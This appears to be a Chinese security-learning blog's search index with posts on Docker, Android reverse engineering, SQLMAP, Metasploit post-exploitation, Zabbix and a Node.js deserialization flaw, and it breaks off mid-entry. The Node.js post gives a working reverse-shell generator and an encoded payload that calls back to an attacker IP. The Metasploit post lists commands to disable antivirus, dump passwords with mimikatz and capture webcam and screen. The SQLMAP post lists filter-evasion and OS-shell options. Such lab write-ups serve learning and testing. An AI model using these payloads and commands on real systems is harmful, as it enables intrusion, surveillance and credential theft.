<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Docker （二）容器与镜像基础使用]]></title>
    <url>%2F2019%2F02%2F28%2FDocker%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AE%B9%E5%99%A8%E4%B8%8E%E9%95%9C%E5%83%8F%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Docker 容器使用使用 Docker 创建 Web 应用 拉取镜像 docker pull training/webapp 创建容器 docker run -d -p 7878:5000 training/webapp python app.py-d 后台运行，不关联到当前终端-p 指定主机和容器的端口映射 访问web页面由于使用了 -p 7878:5000，将 主机的7878端口映射到容器的5000端口此时通过访问主机的7878端口即可访问到容器运行的网页 容器基础操作命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@wcute ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa8839d758dce training/webapp &quot;python app.py&quot; 6 minutes ago Up 6 minutes 0.0.0.0:7878-&gt;5000/tcp silly_payne# 指定id查看端口映射[root@wcute ~]# docker port a88 5000/tcp -&gt; 0.0.0.0:7878# 指定NAMES查看端口映射5000/tcp -&gt; 0.0.0.0:7878[root@wcute ~]# docker port sillyError: No such container: silly[root@wcute ~]# docker port silly_payne# 查看WEB应用日志[root@wcute ~]# docker logs a88 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)42.238.187.23 - - [12/Jan/2019 09:18:34] &quot;GET / HTTP/1.1&quot; 200 -42.238.187.23 - - [12/Jan/2019 09:18:34] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -# 查看WEB应用程序容器的进程[root@wcute ~]# docker top a88UID PID PPID C STIME TTY TIME CMDroot 30965 30940 0 17:18 ? 00:00:00 python app.py# 检查 WEB 应用程序[root@wcute ~]# docker inspect a88[ &#123; &quot;Id&quot;: &quot;a8839d758dcec337dc6c48215467354ae12a6743dac7cd8fd78de87c2a0232ec&quot;, &quot;Created&quot;: &quot;2019-01-12T09:18:28.646596277Z&quot;, &quot;Path&quot;: &quot;python&quot;, &quot;Args&quot;: [ &quot;app.py&quot; ], &quot;State&quot;: &#123; &quot;Status&quot;: &quot;running&quot;, &quot;Running&quot;: true, ...........省略# 重启web容器[root@wcute ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa8839d758dce training/webapp &quot;python app.py&quot; 17 minutes ago Up 17 minutes 0.0.0.0:7878-&gt;5000/tcp silly_payne[root@wcute ~]# docker stop a88a88[root@wcute ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@wcute ~]# docker start a8839a8839[root@wcute ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa8839d758dce training/webapp &quot;python app.py&quot; 18 minutes ago Up 3 seconds 0.0.0.0:7878-&gt;5000/tcp silly_payne# 移除WEB应用容器（移除前需要先停止）[root@wcute ~]# docker rm a88Error response from daemon: You cannot remove a running container a8839d758dcec337dc6c48215467354ae12a6743dac7cd8fd78de87c2a0232ec. Stop the container before attempting removal or force remove[root@wcute ~]# docker stop a88a88[root@wcute ~]# docker rm a88a88 Docker 镜像使用镜像基础操作命令12345678910111213141516171819202122232425262728# 查看已有镜像[root@wcute ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 3 years ago 349MB# 查找镜像[root@wcute ~]# docker search webNAME DESCRIPTION STARS OFFICIAL AUTOMATEDphp While designed for web development, the PHP … 4231 [OK]rails Rails is an open-source web application fram… 800 [OK]django Django is a free web application framework, … 780 [OK]redmine Redmine is a flexible project management web… 691 [OK]# 获取新镜像-bash: syntax error near unexpected token `do&apos;[root@wcute ~]# docker pull phpUsing default tag: latestlatest: Pulling from library/php177e7ef0df69: Pull complete...9bf89f2eda24: Pull completeDigest: sha256:cb0c75db3b60d1ab913909cda871a87e11e9294120288ef9239c990d11c6a998Status: Downloaded newer image for php:latest# 运行镜像[root@wcute ~]# docker run phpInteractive shell 使用Dockerfile创建镜像Dockerfile 结构 基础镜像信息（可以从本地已有镜像获取 也可以从默认DockerHub获取） 维护者信息 镜像操作指令 容器启动时执行指令 Dockerfile 指令 FROM指定镜像名称格式为FROM 或FROM :例如FROM ubuntu 或 FROM ubuntu:12.04 MAINTAINER镜像作者格式为 MAINTAINER RUN格式为 RUN 或 RUN [“executable”, “param1”, “param2”]。前者将在 shell 终端中运行命令，即 /bin/sh -c；后者则使用 exec 执行。 CMDCMD [“executable”,”param1’,”param2”] 使用 exec 执行。CMD command param1 param2 在 /bin/sh 中执行，提供给需要交互的应用。CMD [“param1”,”param2”] 提供给 ENTRYPOINT 的默认参数。指定启动容器时执行的命令，每个Dockerfile 只能有一条 CMD命令。如果指定了多条命令，只有最后一条会被执行。如果用户启动容器时指定了运行的命令，则会覆盖掉 CMD 指定的命令。 EXPOSE格式为 EXPOSE […]。告诉 Docker 服务端容器暴露的端口号，供互联系统使用。在启动容器时需要通过 -P，Docker 主机会自动分配一个端口转发到指定的端口。 Dockerfile 创建镜像 创建一个文件夹，并新建一个Dockerfile文件 123456[root@wcute Dockerfile]# vi Dockerfile[root@wcute Dockerfile]# [New] 3L, 66C written[root@wcute Dockerfile]# cat DockerfileFROM ubuntu:latestMAINTAINER wcuteCMD echo &apos; wcute is so cute &apos; 使用build命令编译生成镜像 123456789101112131415161718192021 # . 表示在当前路径下[root@wcute Dockerfile]# docker build .Sending build context to Docker daemon 2.048kBStep 1/3 : FROM ubuntu:latestlatest: Pulling from library/ubuntu6cf436f81810: Pull complete987088a85b96: Pull completeb4624b3efe06: Pull completed42beb8ded59: Pull completeDigest: sha256:7a47ccc3bbe8a451b500d2b53104868b46d60ee8f5b35a24b41a86077c650210Status: Downloaded newer image for ubuntu:latest ---&gt; 47b19964fb50Step 2/3 : MAINTAINER wcute ---&gt; Running in ad5b043ef12aRemoving intermediate container ad5b043ef12a ---&gt; 2ee3d5ef3a5bStep 3/3 : CMD echo &apos; wcute is so cute &apos; ---&gt; Running in 7a8df68e1b9eRemoving intermediate container 7a8df68e1b9e ---&gt; 7198213cefadSuccessfully built 7198213cefad 查看新生成的镜像 123[root@wcute Dockerfile]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE&lt;none&gt; &lt;none&gt; 7198213cefad 13 minutes ago 88.1MB 运行新生成的镜像 12[root@wcute Dockerfile]# docker run --rm 7198 wcute is so cute 删除镜像 123[root@wcute Dockerfile]# docker rmi 7198Deleted: sha256:7198213cefadf82dec00a697da110c82031ffa0e0931d90ccf1bf637c89bff51Deleted: sha256:2ee3d5ef3a5b76b6bbb8902111bf30f5ab38dd338be61490cf141060ea5102bc 参考链接：http://www.cnblogs.com/fengzheng/p/5181222.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android-动态分析]]></title>
    <url>%2F2019%2F01%2F16%2FAndroid-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[动态调试利用调试器跟踪软件的运行，跟踪分析相关的内存，如寄存器内容，函数执行结果，内存使用情况等等，分析函数功能，明确代码逻辑，挖掘可能存在的漏洞 dex 文件动态调试 工具：IDA调试步骤 打开IDA安装目录，进入dbgsrv，根据模拟器选择适应的android_server版本，使用adb连接上传至模拟器并运行 root@SM-G9350:/data # ./android_serverIDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017Listening on 0.0.0.0:23946… 将 apk 解压后的dex文件拖入IDA，点击Debugger-Debugger options-Set specific options-file from AndroidMainfest.xml，选择要调试的 apk (路径不能含中文字符) 使用adb转发端口到本地 C:\Users\Shinelon&gt; adb forward tcp:23946 tcp:23946 查询 apk 包名，以调试的方式启动（需要AndroidMainfest.xml里设置Android:debuggable=&quot;true&quot;） root@SM-G9350:/data/app # lscom.gaga.sodemo-1 C:\Users\Shinelon&gt;adb shell am start -D -n com.gaga.sodemo/com.gaga.sodemo.MainActivityStarting: Intent { cmp=com.gaga.sodemo/.MainActivity } 进入IDA，选择Debugger-Attach to process进入调试界面 dex 代码注入 工具：frida frida 安装： 安装 python 环境（这里用的 python3.7） 根据 python 下载相应的frida-server（下载地址：https://github.com/frida/frida/releases） 使用 adb 将frida-server上传至模拟器 C:\Users\Shinelon&gt;adb push frida-server-12.2.29-android-x86 /data/local/tmp 赋予权限，开启frida-server root@SM-G9350:/data/local/tmp # chmod 777 frida-serverroot@SM-G9350:/data/local/tmp # ./frida-server 使用firda-ps -U查看 frida 是否安装成功 C:\Users\Shinelon&gt;frida-ps -UPID Name3082 android.process.acore1700 android_server 使用 frida 对 dex 文件代码进行注入 分析代码，发现checkFlag方法对签名信息进行校验，校验成功app弹出’success’提示，因此需要使’checkFlag’方法返回true来触发弹框 使用adb连接模拟器，并开启frida-server，运行apk程序，使用frida-ps -U查看运行的包名（需要注入的程序包名必须存在） 编写脚本hook到checkFlag方法，修改返回值为true运行脚本，发现 app check 成功，frida脚本 hook 成功，此时运行程序显示成功 so 文件动态调试 工具：IDA gdb调试步骤 打开IDA安装目录，进入dbgsrv，根据模拟器选择适应的android_server版本，使用adb连接上传至模拟器并运行 root@SM-G9350:/data # ./android_serverIDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017Listening on 0.0.0.0:23946… 端口转发本地 C:\Users\Shinelon&gt;adb forward tcp:23946 tcp:23946 将 apk 解压后的so文件拖入IDA，选择Debugger-select-Remote ARM LINUX填写对应ip及端口 Debugger- process options-hostname:127.0.0.1 port:23946 点击Debugger-attach to process选择要调试的应用，开始进行调试]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android-静态分析]]></title>
    <url>%2F2019%2F01%2F13%2FAndroid-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Android 基础知识了解Android 应用的逻辑代码是由Java进行开发，所以是第一层就是java代码Java 虚拟机 JVM 运行的是 java 文件编译过后的class文件Android 虚拟机 Dalvik并不是执行Java虚拟机JVM编译后生成的class文件，而是执行再重新整合打包后生成的dex文件编译之后的smali文件 APK：是编译完成后的Android应用程序安装包 dex 文件：是class文件的打包文件 smali 文件：是Dalvik字节码文件 class 文件：是JVM字节码文件 Android APK文件结构 assets 目录存放需要打包到 APK 的静态文件 META-INF 目录存放应用程序签名和证书的目录，保证系统安全和包的完整性 res 目录存放应用程序的资源，图片、字符串等 lib 目录程序依赖的 native 库 AndroidMainfest.xml 文件应用程序的配置文件，描述应用的名字、版本、权限、引用的库文件等 classes.dex 文件Dex可执行文件 resources.arsc 文件编译后资源二进制文件索引，记录资源文件和资源文件 ID 映射关系 静态分析定义在不运行代码的情况下，采用词法分析、语法分析等手段对程序文件进行扫描从而生成程序的反汇编代码，然后阅读反汇编代码来掌握程序功能的一种技术 分析大概流程 对APK文件进行反编译 DEX 文件反编译反编译到 smali 工具：apktool Baksmali smali apktool 反编译apktool d crackme02.apk apktool 回编译生成test.apk文件apktool b crackme02 -o test.apk 反编译到 java 工具：dex2jar+JD-GUI jadx jeb AndroidKiller so 文件反编译（一般存放在lib目录下）常用工具：IDA readelf odex 文件反编译 安装测试 apk ，使用adb连接模拟器AndroidKiller_v1.3.1\bin\adb&gt; adb connect 127.0.0.1:21503connected to 127.0.0.1:21503AndroidKiller_v1.3.1\bin\adb&gt; adb forward tcp:31415 tcp:31415 进入apk shell，拷贝system/framework内容AndroidKiller_v1.3.1\bin\adb&gt; adb shellroot@SM-G9350:/ # cd /systemroot@SM-G9350:/system # cp -r framework /sdcardroot@SM-G9350:/system # exitAndroidKiller_v1.3.1\bin\adb&gt; adb pull /sdcard/framework C:\Users\Shinelon\Desktop\test 将 odex 反编译为 smali 文件将smali-xxx.jar baksmali-xxx.jar baksmali smali四个文件及odex文件与framwork 文件放置同一目录下，执行命令生成out文件test&gt; java -jar baksmali.jar -x test.odex -d framework 将smali转为dex文件，执行命令生成test.dex文件test&gt; java -jar smali.jar out -o test.dex 获取软件的基本信息 根据AndroidMainfest.xml文件分析应用权限以及四大组件是否可以导出的一些问题 分析敏感函数 参考链接：https://www.cnblogs.com/doit8791/p/5223201.htmlhttps://www.cnblogs.com/ichunqiu/archive/2018/08/31/9565028.html]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Docker（一） 入门及安装]]></title>
    <url>%2F2019%2F01%2F10%2FDocker%EF%BC%88%E4%B8%80%EF%BC%89%20%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Docker 简介Docker 是一个开源的应用容器引擎，通过将运行环境和应用程序打包到一起，解决部署的环境依赖问题，做到跨平台的分布和使用 一个完整的Docker有以下几个部分组成 Docker Client 客户端Docker Daemon 守护进程Docker Image 镜像Docker Container 容器 Docker 安装在Centos下安装Docker安装条件：内核版本高于3.10的64位系统 查看内核版本 uname -r 更新yum源 yum update 安装需要的软件包 yum install -y yum-utils device-mapper-persistent-data lvm2 设置yum源 yum-config-manager –add-repo https://download.docker.com/linux/centos/docker-ce.repo 查看仓库中docker版本 yum list docker-ce –showduplicates | sort -r 安装docker yum install docker-cesudo yum install docker-ce-17.12.0.ce 启动docker service docker start 测试是否安装成功 docker version 运行一个交互式容器docker 镜像是分层的，使用时需要从一个基础镜像开始，可以使用 docker pull 从docker hub 进行拉取，已经存在命令会直接返回，否则自行下载 docker run -i -t ubuntu:15.10 /bin/bash-i 启动一个可交互的容器-t 在新容器内指定一个伪终端或终端/bin/bash 表示启动容器时要运行的命令 此时已经进入ubuntu15.10系统的容器可以通过exit命令或者使用CTRL+D来退出容器如果需要退出交互式模式且不影响容器运行，可以使用CTRL+PQ命令 启动容器（后台模式）创建一个以进程方式运行的容器 docker run -d ubuntu:15.10 /bin/sh -c “while true; do echo hello world; sleep 1; done”-d 让容器在后台运行，不关联到当前终端的shell上 输出的一串长字符是容器的id（唯一），docker ps 可进行查看查看容器的标准输出日志 docker logs &lt;CONTAINER ID/NAMES&gt; 容器停止 docker stop docker stop 常用 Docker 命令 docker pull 拉取镜像docker run 运行容器docker images 列出所有镜像docker ps 查看容器docker start/stop/restart/kill 容器的启动停止docker logs 查看容器日志]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP命令操作]]></title>
    <url>%2F2018%2F12%2F24%2FSQLMAP%20%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[SQLMAP 基本操作 判断是否存在注入 sqlmap.py -u “ http://url “ (注入点参数大于2时必须加双引号) 判断文本中的请求是否存在注入抓包获取http请求，将Web数据包存在test.txt中 sqlmap.py -r “test.txt” 查询当前用户下的所有数据库 sqlmap.py -u “ http://url “ –dbs 查询当前用户下A数据库的数据表 sqlmap.py -u “ http://url “ -D A –tables 查询当前用户下A数据库的B数据表的字段 sqlmap.py -u “ http://url “ -D A -T -B –columns 查询查询当前用户下A数据库的B数据表的c1,c2字段的内容 sqlmap.py -u “ http://url “ -D A -T -B -C c1,c2 –dump 获取数据库的所有用户 sqlmap.py -u “ http://url “ –users 获取数据库用户的密码 sqlmap.py -u “ http://url “ –passwords 获取当前数据库名称 sqlmap.py -u “ http://url “ –current-db 获取当前数据库的用户名称 sqlmap.py -u “ http://url “ –current-user SQLMAP 进阶命令参数使用 探测等级：--level 5 当前用户是否为管理权限：--is-dba 列出数据库管理员角色：--roles HTTP Referer 头：--referer 运行自定义SQL语句：--sql-shell 运行任意操作系统命令：--os-cmd --os-shell 从数据库服务器中读取文件：--file-read 上传文件到数据库服务器中：--file-write --file-dest tamper 参数使用格式： sqlmap.py -u “ http://url “ –tamper “模块名”常用 tamper 脚本 apostrophemask.py将引号替换为UTF-8，用于过滤单引号 base64encode.py替换为 base64编码 multipleaspace.py围绕 SQL 关键字添加多个空格 space2plus.py用+号替换空格 nonrecurisvereplacement.py作为双重查询语句，用双重语句替代预定义sql关键字 space2randomblank.py将空格替换为其他有效字符 unionalltounion.py将 union all select替换为union select securesphere.py追加特制字符串使用前：1 and 1=1使用后：1 and 1=1 and ‘0having=0having’ space2hash.py将空格替换为#号，并添加一个随机字符串和换行符 space2mssqlblank.py(mssql)将空格替换为其他空符号 space2mssqlhash.py将空格替换为#号，并添加一个换行符 between.py用not between 0 and 替换大于号（&gt;）,用between and替换等号（=） percentage.pyASP 欲奴再每个字符前面添加一个%号 sp_password.py从DBMS日志的自动模糊处理的有效载荷中追加sp_password charencode.py对给定的payload全部字符使用url编码（已经编码字符串不处理） randomcase.py随机大小写 charunicodeencode.py字符串Unicode编码 space2comment.py将空格替换为/**/ equaltolike.py将等号替换为like greatest.py绕过对&gt;号的过滤，用greatest替换&gt;号 ifnull2ifisnull.py绕过对ifnull的过滤，替换类似ifnull(a,b)为if(isnull(a),b,a) modsecurityversioned.py过滤空格，使用mysql内联注释的方式进行注入 space2mysqlblank.py将空格替换为其他空白符号（mysql） modsecurityzeroversioned.py使用mysql内联注释的方式进行注入（mysql5.0） space2mysqldash.py将空格替换为--,并添加一个换行符 bluecoat.pysql语句之后用有效的随机空白符替换空格符，随后用like替换=号 versionedkeywords.py注释绕过 halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，再每个关键字之前添加mysql版本注释 space2morehash.py将空格替换为#号，并添加一个随机字符串和换行符 apostrophenullencode.py用非法双字节Unicode字符替换单引号 appendnullbyte.py在有效负荷的结束为止加载零字节字符编码 chardoubleencode.py对给定的payload全部字符使用双重url编码（不处理已经编码的字符） unmagicquotes.py用一个多字节组合（%bf%27）和末尾通用注释一起替换空格 randomcomments.py用/**/分割sql关键字]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用MSF进行后渗透攻击]]></title>
    <url>%2F2018%2F12%2F23%2F%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[本篇主要讲利用MSF获取靶机shell后可进行的操作及利用方式前提：已经通过Samba服务漏洞获取了Meterpreter shell，利用方式可参考https://www.jianshu.com/p/839ac7af5e4c 后渗透攻击：信息搜集进程迁移刚获取的Meterpreter shell非常脆弱易受攻击，例如攻击者可以利用浏览器漏洞攻陷目标机器，攻击渗透后浏览器有可能被用户关闭。所以第一步就是要移动进程，将它和目标机中一个稳定的进程绑在一起，而不需要对磁盘进行任何写入操作。（渗透更难被检测） 使用 ps命令获取靶机正在运行的进程 使用getpid命令查看Meterpreter Shell 的进程号 使用migrate PID命令迁移进程,进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（run post/windows/manage/migrate）命令，系统会自动寻找合适的进程然后迁移 系统命令获得稳定进程后，收集系统信息 使用sysinfo 命令查看目标机的系统信息 输入run post/windows/gather/checkvm 命令查看靶机是否允许在虚拟机上 检查靶机是否正在运行，使用 idletime查看靶机最近运行的时间 使用route命令查看靶机完整的网络设置 background 命令可将当前会话放置后台，适合在多个Meterpreter 会话的场景下使用。使用 getuid 命令查看当前靶机已经渗透成功的用户名 使用run post/windows/manage/killav命令关闭靶机系统杀毒软件 使用run post/windows/manage/enable_rdp命令启动靶机远程桌面协议 使用background命令将当前Meterpreter终端隐藏在后台 sessions -i 重新调用终端 使用 run post/windows/gather/enum_logged_on_users列举当前登录靶机用户 使用 run post/windows/gather/enum_applications 列举安装在靶机上的应用程序 很多用户习惯将计算机设置自动登录，可以使用 run windows/gather/credentials/windows_autologin 抓取自动登录的用户名和密码 Mimikatz 抓取密码使用load mimikatz命令加载模块,msv抓取解密一下成功获取密码 没有抓取到，此时可利用扩展插件Espia 抓取靶机屏幕截图。使用 load espia 命令加载插件，screengrab或者 screenshot 命令抓取截图 一些其他可利用的命令 webcam_list查看靶机是否有摄像头webcam_snap打开靶机摄像头拍一张照片webcam_stream开启直播模式，抓取视频 参考链接：https://www.cnblogs.com/bmjoker/p/10151708.html]]></content>
      <categories>
        <category>Metasploit 渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Node.js 反序列化漏洞(CVE-2017-5941)]]></title>
    <url>%2F2018%2F12%2F23%2FNode.js%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-5941)%2F</url>
    <content type="text"><![CDATA[漏洞详情不可信的数据传入 unserialize() 函数，通过传递立即调用函数表达式（IIFE）的 JavaScript 对象可以实现任意代码执行。来自网络请求的 cookie 会传递到node-serialize 的序列化/反序列化模块 的 unserialize() 函数中 payload test.js123var serialize = require(&apos;node-serialize&apos;);var payload = &apos;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;, function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()&quot;&#125;&apos;;serialize.unserialize(payload); 漏洞复现安装序列化模块 npm install node-serialize@0.0.4 –save 编写测试页面代码123456789101112131415var http = require(&apos;http&apos;);http.createServer(function (request, response) &#123; // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;); // 发送响应数据 &quot;Hello World&quot; response.end(&apos;Hello World\n&apos;);&#125;).listen(8888);// 终端打印如下信息console.log(&apos;Server running at http://127.0.0.1:8888/&apos;); 运行代码后使用web浏览器访问ip:8888并抓包使用代码生成反向shell的payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/python# Generator for encoded NodeJS reverse shells# Based on the NodeJS reverse shell by Evilpacket# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)# Insecurety Research (2013) - insecurety.netimport sysif len(sys.argv) != 3: print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0]) sys.exit(0)IP_ADDR = sys.argv[1]PORT = sys.argv[2]def charencode(string): &quot;&quot;&quot;String.CharCode&quot;&quot;&quot; encoded = &apos;&apos; for char in string: encoded = encoded + &quot;,&quot; + str(ord(char)) return encoded[1:]print &quot;[+] LHOST = %s&quot; % (IP_ADDR)print &quot;[+] LPORT = %s&quot; % (PORT)NODEJS_REV_SHELL = &apos;&apos;&apos;var net = require(&apos;net&apos;);var spawn = require(&apos;child_process&apos;).spawn;HOST=&quot;%s&quot;;PORT=&quot;%s&quot;;TIMEOUT=&quot;5000&quot;;if (typeof String.prototype.contains === &apos;undefined&apos;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;function c(HOST,PORT) &#123; var client = new net.Socket(); client.connect(PORT, HOST, function() &#123; var sh = spawn(&apos;/bin/sh&apos;,[]); client.write(&quot;Connected!\\n&quot;); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on(&apos;exit&apos;,function(code,signal)&#123; client.end(&quot;Disconnected!\\n&quot;); &#125;); &#125;); client.on(&apos;error&apos;, function(e) &#123; setTimeout(c(HOST,PORT), TIMEOUT); &#125;);&#125;c(HOST,PORT);&apos;&apos;&apos; % (IP_ADDR, PORT)print &quot;[+] Encoding&quot;PAYLOAD = charencode(NODEJS_REV_SHELL)print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD) 生成反序列化payload，并在函数后面添加 IIFE 括号 ()1&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,57,53,46,49,51,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))()&quot;&#125; 将payload进行base64编码，再Cookie头中加入 Payload，开启监听，向服务器发送请求此时获取到Ubuntu的shell 参考链接：https://paper.seebug.org/213/]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Zabbix（分布式系统监视）漏洞学习]]></title>
    <url>%2F2018%2F12%2F21%2FZabbix%EF%BC%88%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9B%91%E8%A7%86%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Zabbix 安装部署安装环境 OS：CentOS 7.2 64bitZabbix版本：3.0.24MySQL版本：5.7注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。 安装步骤 关闭selinux和iptables [root@test ~]# systemctl stop firewalld.service[root@test ~]# setenforce 0setenforce: SELinux is disabled 安装Zabbix rpm包仓库 [root@test ~]# rpm -vhi http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm 安装zabbix-server-mysql和zabbix-web-mysql [root@test ~]# yum install -y zabbix-server-mysql zabbix-web-mysql 启动mysql [root@test ~]# systemctl start mysqld[root@test ~]# /sbin/chkconfig mysqld on #开机启动[root@test ~]# mysql_secure_installation #初始化数据库信息 创建zabbix数据库，创建zabbix账号 [root@test ~]# mysql -uroot -pmysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all privileges on zabbix.* to ‘zabbix‘@’localhost’ identified by ‘zabbix’;Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.01 sec) 导入默认的zabbix数据库信息 [root@test ~]# zcat /usr/share/doc/zabbix-server-mysql-3.0.24/create.sql.gz | mysql zabbix -uzabbix -pzabbix 修改zabbix_server.conf的配置文件 [root@test ~]# grep ^DB /etc/zabbix/zabbix_server.confDBName=zabbixDBUser=zabbixDBPassword=zabbix 修改配置文件/etc/httpd/conf.d/zabbix.conf，时区改成 Asia/Shanghai php_value date.timezone Asia/Shanghai 启动apache zabbix-server服务并设置为开机启动 [root@test ~]# systemctl start httpd[root@test ~]# systemctl enable httpd[root@test ~]# netstat -an |grep 80tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN[root@test ~]# systemctl start zabbix-server[root@test ~]# systemctl enable zabbix-server 访问http://ip/zabbix/setup.php进入安装页面 Next step-Next step-配置zabbix-Next step-Next step-Finsh 默认账号Admin 密码zabbix 移除或改名web目录下面的setup.php文件 [root@test ~]# cd /usr/share/zabbix/[root@test zabbix]# mv setup.php setup.php.bak Zabbix 默认密码弱口令WeapPassword = [(“admin”,”zabbix”),(“Admin”,”zabbix”),(“guest”,””)] zabbix latest.php SQL注入漏洞（CVE-2016-10134）漏洞详情：latest.php处toogle_ids[]参数SQL注入，可获取系统权限利用条件：登录后影响版本：2.2.x, 